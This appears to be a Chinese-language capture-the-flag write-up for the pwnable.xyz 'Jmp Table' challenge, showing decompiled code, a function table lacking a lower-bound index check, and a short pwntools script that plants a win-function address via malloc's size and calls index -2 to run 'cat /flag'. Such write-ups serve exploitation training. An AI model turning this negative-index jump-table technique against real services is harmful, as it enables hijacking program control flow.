---
title: pwnable-jmp-table
date: 2019-12-21 14:30:41
tags: 
- pwn
- pwnable.xyz
---

# pwnable.xyz  Jmp Table 

### 0x1 分析

老样子，看一看安全选项开启程度：

![](https://i.loli.net/2019/12/21/CSzd2IterAsJP48.png)

看样子，地址是固定的。(事实上我们之后就是用到了这个)

观察一下`main`函数：

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int v3; // [rsp+Ch] [rbp-4h]

  setup();
  while ( 1 )
  {
    print_menu();
    printf("> ", argv);
    v3 = read_long();
    if ( v3 <= 4 )
      (*(&vtable + v3))();
    else
      puts("Invalid.");
  }
}
```

仍然是菜单选项呢

看一下菜单：

`return puts("1. Malloc\n2. Free\n3. Read\n4. Write\n0. Exit");`

然后就看到通过指针通过地址偏移量调用的函数了。

```assembly
.data:00000000006020B0 size            dq 1                    ; DATA XREF: do_malloc+1E↑w
.data:00000000006020B0                                         ; do_malloc+25↑r ...
.data:00000000006020B8                 public heap_buffer
.data:00000000006020B8 ; void *heap_buffer
.data:00000000006020B8 heap_buffer     dq 1                    ; DATA XREF: do_malloc+3F↑w
.data:00000000006020B8                                         ; do_malloc+50↑w ...
.data:00000000006020C0                 public vtable
.data:00000000006020C0 vtable          dq offset do_exit       ; DATA XREF: main+4E↑o
.data:00000000006020C8                 dq offset do_malloc
.data:00000000006020D0                 dq offset do_free
.data:00000000006020D8                 dq offset do_read
.data:00000000006020E0                 dq offset do_write
```

其实这里有个漏洞的，它在`if`条件句只加入了上限，并没有检查下限`0`。所以我们看到`vtable`位置之前的空间可以利用一下。

`do_malloc`函数：

```c
void *do_malloc()
{
  unsigned __int64 v0; // rax
  void *result; // rax

  printf("Size: ");
  v0 = read_long();
  size = v0;
  result = malloc(v0);
  if ( result )
    heap_buffer = result;
  else
    heap_buffer = (void *)1;
  return result;
}
```

这里可以注意到，`heap_buffer`和`size`就在`vtable`上面，我们可以操作的区域。

然后就是我们要调用的函数了 , 真是一个让人容易忽略的函数呢。:( 

```c
int _()
{
  return system("cat /flag");
}
```

它的地址是`0x400a31`，

那么其实我们可以答题了。

### 0x2 思路

首先我们在菜单`1`读入`0x400a31`到`size`位置，因为`size`位置就在`vtable`前面`0x10`的位置，我们通过调用菜单`-2`即可完成。

### 0x3 代码

``` python
from pwn import *

context.log_level = 'debug'
# p = process("./challenge")
p = remote("svc.pwnable.xyz", 30007)

p.sendafter('> ', '1\n')
p.sendafter('Size: ', str(int('0x400a31', 16)) + '\n')
p.sendafter('> ', '-2\n')
p.sendafter('> ', '0\n')
```



